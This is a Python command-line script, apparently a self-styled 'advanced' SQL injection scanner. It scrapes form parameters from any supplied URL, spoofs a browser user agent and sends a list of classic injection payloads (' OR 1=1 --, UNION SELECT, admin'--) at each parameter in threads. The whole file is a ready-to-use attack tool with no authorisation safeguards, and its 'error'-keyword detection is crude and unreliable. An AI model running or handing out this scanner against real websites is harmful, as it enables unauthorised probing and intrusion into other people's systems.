import requests
import logging
import threading
import shutil
import os
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import time
from inspect import currentframe

# Define user-agent and headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Initialize logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("sqlscan.log"),
        logging.StreamHandler()
    ]
)

# SQL Injection payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "' OR 1=1 #",
    "' UNION SELECT NULL, NULL, NULL --",
    "admin'--",
    "1' AND 1=1",
    "1' OR 'a'='a",
    "1' AND 'a'='a' --",
    "' OR 1=1; --",
    "' OR 1=1#"
]

# Extract parameters from URL
def get_params(url):
    parsed_url = urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    response = requests.get(url, headers=headers)
    
    if response.status_code != 200:
        logging.warning(f"Failed to fetch {url}")
        return []
    
    soup = BeautifulSoup(response.text, 'html.parser')
    params = []

    # Look for GET parameters in all form tags
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        if action:
            action_url = urljoin(url, action)
            for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                if name:
                    params.append((action_url, name))
    
    return params

# Attempt SQL injection
def attempt_sqli(url, param, payload):
    payload_url = f"{url}?{param}={payload}"
    response = requests.get(payload_url, headers=headers)
    
    if response.status_code == 200 and "error" in response.text.lower():
        logging.info(f"Potential SQLi vulnerability found: {payload_url}")
        return True
    return False

# Scanner thread
def scanner_thread(url, param):
    for payload in sql_payloads:
        logging.debug(f"Testing payload {payload} on {param}")
        if attempt_sqli(url, param, payload):
            logging.info(f"SQLi vulnerability found at {url} with payload {payload}")
        time.sleep(1)

# Main scanner function
def scan(url):
    logging.info(f"Starting SQLi scan on {url}")

    params = get_params(url)
    if not params:
        logging.info("No parameters found for SQL injection testing.")
        return
    
    threads = []
    for url, param in params:
        thread = threading.Thread(target=scanner_thread, args=(url, param))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    logging.info(f"Scan complete for {url}")

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
    parser.add_argument('-u', '--url', type=str, required=True, help="URL to scan for SQL Injection vulnerabilities")
    args = parser.parse_args()

    # Start the scan
    scan(args.url)
